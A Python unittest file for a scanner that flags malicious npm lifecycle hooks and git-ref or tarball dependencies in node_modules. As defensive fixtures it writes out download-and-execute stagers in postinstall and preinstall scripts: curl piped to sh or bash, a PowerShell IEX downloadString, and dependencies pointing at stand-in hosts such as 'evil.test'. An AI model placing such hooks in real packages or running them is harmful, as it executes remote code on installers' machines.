"""Tests for the dependency lifecycle-hook audit (audit D2 / threat-currency).

Builds throwaway node_modules trees and asserts the audit flags malicious
lifecycle hooks + git-ref deps while staying quiet on benign manifests.
"""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from keyleak.lifecycle_audit import audit_node_dependencies
from keyleak.local_scanner import scan_path


def _write(root: Path, rel: str, data: dict) -> None:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(json.dumps(data), encoding="utf-8")


class LifecycleAuditTests(unittest.TestCase):
    def _audit(self, build):
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            build(root)
            return audit_node_dependencies(str(root))

    def test_flags_curl_pipe_sh_in_dependency_postinstall(self):
        findings = self._audit(lambda r: _write(
            r, "node_modules/evil-pkg/package.json",
            {"name": "evil-pkg", "scripts": {"postinstall": "curl http://x/y.sh | sh"}},
        ))
        types = {f.type for f in findings}
        self.assertIn("npm_lifecycle_hook", types)
        f = next(f for f in findings if f.type == "npm_lifecycle_hook")
        self.assertEqual(f.severity, "high")
        self.assertEqual(f.detector_id, "leak.npm_lifecycle_hook")

    def test_flags_bun_stager_and_payload_filename(self):
        findings = self._audit(lambda r: _write(
            r, "node_modules/pkg/package.json",
            {"name": "pkg", "scripts": {"prepare": "bun run tanstack_runner.js && exit 1"}},
        ))
        self.assertTrue(any(f.type == "npm_lifecycle_hook" for f in findings))

    def test_flags_optional_dependency_git_ref_high(self):
        findings = self._audit(lambda r: _write(
            r, "node_modules/pkg/package.json",
            {"name": "pkg", "optionalDependencies": {"helper": "github:attacker/helper#deadbeef"}},
        ))
        f = next(f for f in findings if f.type == "npm_git_ref_dependency")
        self.assertEqual(f.severity, "high")

    def test_benign_manifest_is_quiet(self):
        findings = self._audit(lambda r: _write(
            r, "node_modules/lodash/package.json",
            {"name": "lodash", "version": "4.17.21",
             "scripts": {"test": "jest", "build": "tsc"},
             "dependencies": {"left-pad": "^1.3.0"}},
        ))
        self.assertEqual(findings, [])

    def test_benign_lifecycle_hook_is_quiet(self):
        # A normal postinstall (e.g. building a native module) must not flag.
        findings = self._audit(lambda r: _write(
            r, "node_modules/pkg/package.json",
            {"name": "pkg", "scripts": {"postinstall": "node-gyp rebuild"}},
        ))
        self.assertEqual(findings, [])

    def test_flags_non_pipe_download_exec_forms(self):
        # Gate D2-FN: command-substitution and PowerShell stagers (not just pipe).
        for cmd in ['sh -c "$(curl -fsSL http://x/p)"',
                    'powershell -c "IEX(New-Object Net.WebClient).downloadString(\'http://x/p\')"']:
            findings = self._audit(lambda r, c=cmd: _write(
                r, "node_modules/e/package.json", {"name": "e", "scripts": {"postinstall": c}}))
            self.assertTrue(any(f.type == "npm_lifecycle_hook" and f.severity == "high" for f in findings), cmd)

    def test_flags_nested_monorepo_node_modules(self):
        # Gate D2-FN: deps under a nested package's node_modules.
        findings = self._audit(lambda r: _write(
            r, "packages/a/node_modules/evil/package.json",
            {"name": "evil", "scripts": {"preinstall": "curl http://c2/x | bash"}}))
        self.assertTrue(any(f.type == "npm_lifecycle_hook" for f in findings))

    def test_flags_bare_github_shorthand_and_tarball(self):
        findings = self._audit(lambda r: _write(
            r, "node_modules/p/package.json",
            {"name": "p", "dependencies": {"a": "attacker/payload", "b": "https://evil.test/m.tgz"}}))
        self.assertEqual(sum(1 for f in findings if f.type == "npm_git_ref_dependency"), 2)

    def test_bare_bun_run_is_not_flagged(self):
        # Gate D2-FP: bare `bun run build` is a legit package-manager call.
        findings = self._audit(lambda r: _write(
            r, "node_modules/p/package.json", {"name": "p", "scripts": {"postinstall": "bun run build"}}))
        self.assertEqual(findings, [])

    def test_malformed_and_oversized_manifests_do_not_crash(self):
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "node_modules/bad").mkdir(parents=True)
            (root / "node_modules/bad/package.json").write_text("{not json")
            (root / "node_modules/arr").mkdir(parents=True)
            (root / "node_modules/arr/package.json").write_text("[1,2,3]")
            # Should not raise.
            self.assertEqual(audit_node_dependencies(str(root)), [])

    def test_scan_path_includes_lifecycle_findings(self):
        # End to end: `keyleak local .` surfaces dependency lifecycle hooks even
        # though the regex pack skips node_modules.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            _write(root, "package.json", {"name": "app"})
            _write(root, "node_modules/evil/package.json",
                   {"name": "evil", "scripts": {"preinstall": "curl http://c2/x | bash"}})
            report = scan_path(str(root), profile="launch-gate")
            self.assertTrue(any(f.type == "npm_lifecycle_hook" for f in report.findings))


if __name__ == "__main__":
    unittest.main()
